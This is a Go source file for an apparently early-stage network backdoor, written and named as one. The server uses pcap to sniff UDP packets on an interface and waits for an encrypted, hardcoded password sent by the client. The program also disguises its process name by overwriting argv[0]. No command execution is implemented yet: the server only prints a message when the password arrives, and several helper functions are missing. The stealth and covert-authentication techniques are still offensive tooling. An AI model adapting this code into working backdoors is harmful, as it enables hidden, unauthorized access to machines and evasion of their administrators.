package main

import(
	"os"
	"reflect"
	"unsafe"
	"flag"
	"fmt"
	"io"
	"log"
	"github.com/google/gopacket/layers"
	"golang.org/x/crypto/ssh/terminal"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)

const passwd = "DAMNPANDIMENSIONALMICE";

func main(){

	SetProcessName("lol1");

	//flags
	modePtr := flag.String("mode", "client", "The mode of the application, may either be" +
		" client or server. Defaults to client.");
	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
	portPtr := flag.Int("port", 80, "The port to connect to in client mode, or to listen on in server mode. Defaults to 80.");
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");

	flag.Parse();

	intiateTools();
	
	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr);
		intiateClient(*ipPtr, *portPtr);
		break;
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
		intiateServer(*interfacePtr, *portPtr);
	}
}

func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "";
    }
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String();
            }
        }
    }
    return "";
}

func intiateClient(ip string, port int){

	// hostaddr := fmt.Sprintf("%s:%d", ip, port);
	// conn, err := net.Dial("udp", hostaddr);
	// if err != nil {
	// 	fmt.Printf("Failed to dial server at %s.\n", hostaddr);
	// 	os.Exit(1);
	// }

	// defer conn.Close();
	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	chk(err)

	for {
		fmt.Print("Please input the authentication code: ");
		authcode, _ := terminal.ReadPassword(0);
		authstr := string(authcode);

		if authstr == passwd {
			ciphertext := encrypt_data(authstr);
			_, err = conn.WriteToUDP([]byte(ciphertext), &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
			if err != nil {
				panic(err)
			}
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}	
}

func intiateServer(iface string, port int){

	if handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever); err != nil {
		panic(err);
	} else if err := handle.SetBPFFilter("udp"); err != nil {  
		panic(err);
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for {
			packet, err := packetSource.NextPacket() 
			if err == io.EOF {
				break
			} else if err != nil {
				log.Println("Error:", err)
				continue;
			}
			if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {;
				udp, _ := udpLayer.(*layers.UDP);
				handlePacket(udp, port);
			}
			
		}
	}
}

func handlePacket(packet *layers.UDP, port int){
	if port == int(packet.DstPort) {
		data := decrypt_data([]byte(packet.Payload));
		if data == passwd {
			fmt.Printf("Found auth code!");
		}
	}
}


func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}
